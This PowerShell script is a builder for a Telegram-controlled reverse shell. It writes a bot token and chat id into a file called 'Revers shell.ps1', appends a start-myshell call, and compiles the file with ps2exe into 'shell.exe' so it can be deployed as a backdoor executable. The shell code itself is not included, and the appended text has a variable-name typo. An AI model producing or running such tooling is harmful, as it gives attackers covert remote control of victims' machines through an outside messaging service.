$apiToken = "Your API token"
$chat_id = "chat id to your telegram group"

function convertTo-EXE($path)
{
    Install-Module ps2exe
    ps2exe $path 'shell.exe'
    Write-Host "Your shell is ready. $path\shell.exe"
}
function Add-details($apiToken,$chat_id)
{
    $path = Invoke-Expression -Command cd
    $test = "`r`n`$apapiToken = $apiToken `r`n`$chat_id = $chat_id start-myshell -apiToken `$apiToken -chat_id `$chat_id"
    $test | Out-File "$path\Revers shell.ps1" -Append -Encoding utf8
    convertTo-EXE -path $path
}
Add-details -apiToken $apiToken -chat_id $chat_id
